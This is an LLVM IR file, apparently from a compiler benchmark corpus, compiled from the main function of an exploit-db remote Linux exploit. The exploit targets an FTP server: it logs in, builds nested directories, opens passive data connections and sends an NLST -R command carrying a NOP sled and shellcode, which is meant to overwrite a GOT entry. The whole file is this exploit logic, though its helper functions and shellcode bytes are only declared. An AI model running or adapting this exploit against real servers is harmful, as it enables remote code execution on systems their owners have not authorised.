; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4478.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4478.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"anonymous\00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@MAXPATH = common dso_local global i32 0, align 4
@GOT = common dso_local global i32 0, align 4
@BSS = common dso_local global i32 0, align 4
@__const.main.jmpc = private unnamed_addr constant [3 x i32] [i32 305445478, i32 -1036425640, i32 -452986251], align 4
@.str.2 = private unnamed_addr constant [10 x i8] c"h:p:u:P:?\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [34 x i8] c"[+] GOT: %p - .bss (jmpcode): %p\0A\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"[+] %s:%d (user: %s pass: %s)\0A\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"331\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"USER %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"PASS %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"230\00", align 1
@.str.9 = private unnamed_addr constant [18 x i8] c"[!] login failed\0A\00", align 1
@.str.10 = private unnamed_addr constant [22 x i8] c"MKD %s\0AMKD %s\0AMKD %s\0A\00", align 1
@.str.11 = private unnamed_addr constant [4 x i8] c"257\00", align 1
@.str.12 = private unnamed_addr constant [31 x i8] c"[!] couldn't make directories\0A\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"[+] PASV\0A\00", align 1
@.str.14 = private unnamed_addr constant [4 x i8] c"227\00", align 1
@.str.15 = private unnamed_addr constant [6 x i8] c"PASV\0A\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.17 = private unnamed_addr constant [14 x i8] c"[!] aborting\0A\00", align 1
@.str.18 = private unnamed_addr constant [22 x i8] c"[+] writing jumpcode\0A\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"NLST -R\0A\00", align 1
@.str.20 = private unnamed_addr constant [22 x i8] c"RMD %s\0ARMD %s\0ARMD %s\0A\00", align 1
@.str.21 = private unnamed_addr constant [8 x i8] c"MKD %s\0A\00", align 1
@.str.22 = private unnamed_addr constant [3 x i8] c"4\12\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.23 = private unnamed_addr constant [50 x i8] c"[+] overwriting GOT entry and sending shellcode\0A\0A\00", align 1
@.str.24 = private unnamed_addr constant [11 x i8] c"NLST -R%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2 x i32], align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [5 x i32], align 16
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i64, align 8
  %18 = alloca [2048 x i8], align 16
  %19 = alloca i32, align 4
  %20 = alloca [3 x i32], align 4
  %21 = alloca [3 x i32], align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 21, i32* %8, align 4
  store i8* null, i8** %11, align 8
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8** %12, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i8** %13, align 8
  %22 = load i32, i32* @MAXPATH, align 4
  %23 = zext i32 %22 to i64
  %24 = call i8* @llvm.stacksave()
  store i8* %24, i8** %16, align 8
  %25 = mul nuw i64 5, %23
  %26 = alloca i8, i64 %25, align 16
  store i64 %23, i64* %17, align 8
  %27 = load i32, i32* @GOT, align 4
  store i32 %27, i32* %19, align 4
  %28 = getelementptr inbounds [3 x i32], [3 x i32]* %20, i64 0, i64 0
  %29 = load i32, i32* @BSS, align 4
  store i32 %29, i32* %28, align 4
  %30 = getelementptr inbounds i32, i32* %28, i64 1
  %31 = load i32, i32* @BSS, align 4
  %32 = add nsw i32 %31, 4
  store i32 %32, i32* %30, align 4
  %33 = getelementptr inbounds i32, i32* %30, i64 1
  %34 = load i32, i32* @BSS, align 4
  %35 = add nsw i32 %34, 8
  store i32 %35, i32* %33, align 4
  %36 = bitcast [3 x i32]* %21 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %36, i8* align 4 bitcast ([3 x i32]* @__const.main.jmpc to i8*), i64 12, i1 false)
  br label %37

37:                                               ; preds = %59, %2
  %38 = load i32, i32* %4, align 4
  %39 = load i8**, i8*** %5, align 8
  %40 = call i32 @getopt(i32 %38, i8** %39, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  store i32 %40, i32* %7, align 4
  %41 = icmp ne i32 %40, -1
  br i1 %41, label %42, label %60

42:                                               ; preds = %37
  %43 = load i32, i32* %7, align 4
  switch i32 %43, label %54 [
    i32 104, label %44
    i32 112, label %46
    i32 117, label %49
    i32 80, label %51
    i32 63, label %53
  ]

44:                                               ; preds = %42
  %45 = load i8*, i8** @optarg, align 8
  store i8* %45, i8** %11, align 8
  br label %59

46:                                               ; preds = %42
  %47 = load i8*, i8** @optarg, align 8
  %48 = call i32 @atoi(i8* %47)
  store i32 %48, i32* %8, align 4
  br label %59

49:                                               ; preds = %42
  %50 = load i8*, i8** @optarg, align 8
  store i8* %50, i8** %12, align 8
  br label %59

51:                                               ; preds = %42
  %52 = load i8*, i8** @optarg, align 8
  store i8* %52, i8** %13, align 8
  br label %59

53:                                               ; preds = %42
  br label %54

54:                                               ; preds = %42, %53
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 0
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @usage(i8* %57)
  br label %59

59:                                               ; preds = %54, %51, %49, %46, %44
  br label %37

60:                                               ; preds = %37
  %61 = load i8*, i8** %11, align 8
  %62 = icmp eq i8* %61, null
  br i1 %62, label %63, label %68

63:                                               ; preds = %60
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 0
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @usage(i8* %66)
  br label %68

68:                                               ; preds = %63, %60
  %69 = load i32, i32* %19, align 4
  %70 = sext i32 %69 to i64
  %71 = inttoptr i64 %70 to i8*
  %72 = getelementptr inbounds [3 x i32], [3 x i32]* %20, i64 0, i64 0
  %73 = load i32, i32* %72, align 4
  %74 = sext i32 %73 to i64
  %75 = inttoptr i64 %74 to i8*
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i8* %71, i8* %75)
  %77 = getelementptr inbounds [3 x i32], [3 x i32]* %20, i64 0, i64 0
  %78 = getelementptr inbounds [3 x i32], [3 x i32]* %21, i64 0, i64 0
  %79 = load i32, i32* %19, align 4
  %80 = bitcast i8* %26 to i8**
  %81 = call i32 @fmt(i32* %77, i32* %78, i32 %79, i8** %80)
  %82 = load i8*, i8** %11, align 8
  %83 = load i32, i32* %8, align 4
  %84 = load i8*, i8** %12, align 8
  %85 = load i8*, i8** %13, align 8
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0), i8* %82, i32 %83, i8* %84, i8* %85)
  %87 = load i32, i32* %8, align 4
  %88 = load i8*, i8** %11, align 8
  %89 = call i32 @sock(i32 %87, i8* %88)
  %90 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  store i32 %89, i32* %90, align 4
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = load i8*, i8** %12, align 8
  %94 = call i8* (i32, i8*, i8*, ...) @s_send(i32 %92, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i8* %93)
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %96 = load i32, i32* %95, align 4
  %97 = load i8*, i8** %13, align 8
  %98 = call i8* (i32, i8*, i8*, ...) @s_send(i32 %96, i8* null, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0), i8* %97)
  store i8* %98, i8** %15, align 8
  %99 = load i8*, i8** %15, align 8
  %100 = call i32* @strstr(i8* %99, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0))
  %101 = icmp eq i32* %100, null
  br i1 %101, label %102, label %105

102:                                              ; preds = %68
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0))
  %104 = call i32 @exit(i32 1) #5
  unreachable

105:                                              ; preds = %68
  %106 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %107 = load i32, i32* %106, align 4
  %108 = mul nsw i64 0, %23
  %109 = getelementptr inbounds i8, i8* %26, i64 %108
  %110 = mul nsw i64 1, %23
  %111 = getelementptr inbounds i8, i8* %26, i64 %110
  %112 = mul nsw i64 2, %23
  %113 = getelementptr inbounds i8, i8* %26, i64 %112
  %114 = call i8* (i32, i8*, i8*, ...) @s_send(i32 %107, i8* null, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i64 0, i64 0), i8* %109, i8* %111, i8* %113)
  store i8* %114, i8** %15, align 8
  %115 = load i8*, i8** %15, align 8
  %116 = call i32* @strstr(i8* %115, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.11, i64 0, i64 0))
  %117 = icmp eq i32* %116, null
  br i1 %117, label %118, label %121

118:                                              ; preds = %105
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.12, i64 0, i64 0))
  %120 = call i32 @exit(i32 1) #5
  unreachable

121:                                              ; preds = %105
  %122 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0))
  %123 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %124 = load i32, i32* %123, align 4
  %125 = call i8* (i32, i8*, i8*, ...) @s_send(i32 %124, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0))
  store i8* %125, i8** %15, align 8
  %126 = load i8*, i8** %15, align 8
  %127 = call i8* @strtok(i8* %126, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  %128 = icmp eq i8* %127, null
  br i1 %128, label %129, label %131

129:                                              ; preds = %121
  %130 = call i32 @exit(i32 1) #5
  unreachable

131:                                              ; preds = %121
  store i32 0, i32* %10, align 4
  br label %132

132:                                              ; preds = %147, %131
  %133 = load i32, i32* %10, align 4
  %134 = icmp ult i32 %133, 5
  br i1 %134, label %135, label %150

135:                                              ; preds = %132
  %136 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  store i8* %136, i8** %14, align 8
  %137 = icmp eq i8* %136, null
  br i1 %137, label %138, label %141

138:                                              ; preds = %135
  %139 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.17, i64 0, i64 0))
  %140 = call i32 @exit(i32 1) #5
  unreachable

141:                                              ; preds = %135
  %142 = load i8*, i8** %14, align 8
  %143 = call i32 @atoi(i8* %142)
  %144 = load i32, i32* %10, align 4
  %145 = zext i32 %144 to i64
  %146 = getelementptr inbounds [5 x i32], [5 x i32]* %9, i64 0, i64 %145
  store i32 %143, i32* %146, align 4
  br label %147

147:                                              ; preds = %141
  %148 = load i32, i32* %10, align 4
  %149 = add i32 %148, 1
  store i32 %149, i32* %10, align 4
  br label %132

150:                                              ; preds = %132
  %151 = getelementptr inbounds [5 x i32], [5 x i32]* %9, i64 0, i64 3
  %152 = load i32, i32* %151, align 4
  %153 = mul nsw i32 %152, 256
  %154 = getelementptr inbounds [5 x i32], [5 x i32]* %9, i64 0, i64 4
  %155 = load i32, i32* %154, align 16
  %156 = add nsw i32 %153, %155
  %157 = load i8*, i8** %11, align 8
  %158 = call i32 @sock(i32 %156, i8* %157)
  %159 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  store i32 %158, i32* %159, align 4
  %160 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.18, i64 0, i64 0))
  %161 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %162 = load i32, i32* %161, align 4
  %163 = call i8* (i32, i8*, i8*, ...) @s_send(i32 %162, i8* null, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i64 0, i64 0))
  %164 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %165 = load i32, i32* %164, align 4
  %166 = mul nsw i64 0, %23
  %167 = getelementptr inbounds i8, i8* %26, i64 %166
  %168 = mul nsw i64 1, %23
  %169 = getelementptr inbounds i8, i8* %26, i64 %168
  %170 = mul nsw i64 2, %23
  %171 = getelementptr inbounds i8, i8* %26, i64 %170
  %172 = call i8* (i32, i8*, i8*, ...) @s_send(i32 %165, i8* null, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.20, i64 0, i64 0), i8* %167, i8* %169, i8* %171)
  %173 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  %174 = load i32, i32* %173, align 4
  %175 = call i32 @close(i32 %174)
  %176 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %177 = load i32, i32* %176, align 4
  %178 = mul nsw i64 3, %23
  %179 = getelementptr inbounds i8, i8* %26, i64 %178
  %180 = call i8* (i32, i8*, i8*, ...) @s_send(i32 %177, i8* null, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.21, i64 0, i64 0), i8* %179)
  %181 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0))
  %182 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %183 = load i32, i32* %182, align 4
  %184 = call i8* (i32, i8*, i8*, ...) @s_send(i32 %183, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0))
  store i8* %184, i8** %15, align 8
  %185 = load i8*, i8** %15, align 8
  %186 = call i8* @strtok(i8* %185, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  %187 = icmp eq i8* %186, null
  br i1 %187, label %188, label %190

188:                                              ; preds = %150
  %189 = call i32 @exit(i32 1) #5
  unreachable

190:                                              ; preds = %150
  store i32 0, i32* %10, align 4
  br label %191

191:                                              ; preds = %206, %190
  %192 = load i32, i32* %10, align 4
  %193 = icmp ult i32 %192, 5
  br i1 %193, label %194, label %209

194:                                              ; preds = %191
  %195 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  store i8* %195, i8** %14, align 8
  %196 = icmp eq i8* %195, null
  br i1 %196, label %197, label %200

197:                                              ; preds = %194
  %198 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.17, i64 0, i64 0))
  %199 = call i32 @exit(i32 1) #5
  unreachable

200:                                              ; preds = %194
  %201 = load i8*, i8** %14, align 8
  %202 = call i32 @atoi(i8* %201)
  %203 = load i32, i32* %10, align 4
  %204 = zext i32 %203 to i64
  %205 = getelementptr inbounds [5 x i32], [5 x i32]* %9, i64 0, i64 %204
  store i32 %202, i32* %205, align 4
  br label %206

206:                                              ; preds = %200
  %207 = load i32, i32* %10, align 4
  %208 = add i32 %207, 1
  store i32 %208, i32* %10, align 4
  br label %191

209:                                              ; preds = %191
  %210 = getelementptr inbounds [5 x i32], [5 x i32]* %9, i64 0, i64 3
  %211 = load i32, i32* %210, align 4
  %212 = mul nsw i32 %211, 256
  %213 = getelementptr inbounds [5 x i32], [5 x i32]* %9, i64 0, i64 4
  %214 = load i32, i32* %213, align 16
  %215 = add nsw i32 %212, %214
  %216 = load i8*, i8** %11, align 8
  %217 = call i32 @sock(i32 %215, i8* %216)
  %218 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  store i32 %217, i32* %218, align 4
  %219 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i64 0, i64 0
  %220 = call i32 @memset(i8* %219, i32 144, i32 2048)
  %221 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i64 0, i64 0
  %222 = getelementptr inbounds i8, i8* %221, i64 3
  %223 = call i32 @memcpy(i8* %222, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.22, i64 0, i64 0), i32 2)
  %224 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i64 0, i64 0
  %225 = getelementptr inbounds i8, i8* %224, i64 12
  %226 = load i8*, i8** @shellcode, align 8
  %227 = call i32 @memcpy(i8* %225, i8* %226, i32 2036)
  %228 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.23, i64 0, i64 0))
  %229 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %230 = load i32, i32* %229, align 4
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i64 0, i64 0
  %232 = call i8* (i32, i8*, i8*, ...) @s_send(i32 %230, i8* null, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.24, i64 0, i64 0), i8* %231)
  store i32 0, i32* %3, align 4
  %233 = load i8*, i8** %16, align 8
  call void @llvm.stackrestore(i8* %233)
  %234 = load i32, i32* %3, align 4
  ret i32 %234
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @getopt(i32, i8**, i8*) #3

declare dso_local i32 @atoi(i8*) #3

declare dso_local i32 @usage(i8*) #3

declare dso_local i32 @printf(i8*, ...) #3

declare dso_local i32 @fmt(i32*, i32*, i32, i8**) #3

declare dso_local i32 @sock(i32, i8*) #3

declare dso_local i8* @s_send(i32, i8*, i8*, ...) #3

declare dso_local i32* @strstr(i8*, i8*) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i8* @strtok(i8*, i8*) #3

declare dso_local i32 @close(i32) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
